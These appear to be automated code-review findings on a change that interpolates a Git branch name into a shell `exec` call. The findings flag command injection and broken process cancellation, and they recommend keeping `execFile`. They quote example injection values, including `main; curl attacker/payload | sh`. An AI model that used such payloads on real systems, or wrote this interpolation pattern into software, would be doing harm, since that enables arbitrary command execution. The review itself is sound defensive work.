findings.title: [P1] Pass the branch as an argument instead of interpolating it
findings.body: When `branch` contains shell syntax, `exec` interprets it as commands rather than one Git argument. For example, semicolons are permitted in Git ref names but are shell command separators. This changes the previous inert argument handling into arbitrary command execution with the application’s privileges. Retain `execFile("git", ["show", branch])`.

findings.title: [P2] Preserve cancellation of the actual Git process
findings.body: On platforms where the shell forks `git`, the returned `ChildProcess` represents the wrapper shell. Calling `.kill()` can terminate only that shell while `git show` continues consuming resources and holding inherited streams. The previous `execFile` call returned the Git process directly.

findings.title: [P2] Preserve cancellation of the actual Git process
findings.body:
`exec()` returns the wrapper shell process rather than the `git` process. On platforms where the shell forks `git`, consumers calling `.kill()` during a long-running `git show` terminate only the shell; Git can continue consuming CPU and holding inherited streams/resources after cancellation.

_Recommend validating this comment independently._

findings.title: [P1] Pass the branch as an argument instead of interpolating it into a shell
findings.body:
`exec` interprets `branch` as shell syntax, enabling command execution when caller-controlled. For example, `topic;id` is a valid Git branch name but executes `id` after `git show topic` on POSIX. The previous `execFile` call treated it as a single inert argument.

_Recommend validating this comment independently._

findings.title: [P1] Pass the branch as an argument instead of interpolating it into a shell command
findings.body:
`exec` invokes a shell, so a branch value containing shell syntax—e.g. `main; curl attacker/payload | sh`—executes arbitrary commands with the application’s privileges. The previous `execFile` call treated the entire value as one Git argument.

_Recommend validating this comment independently._
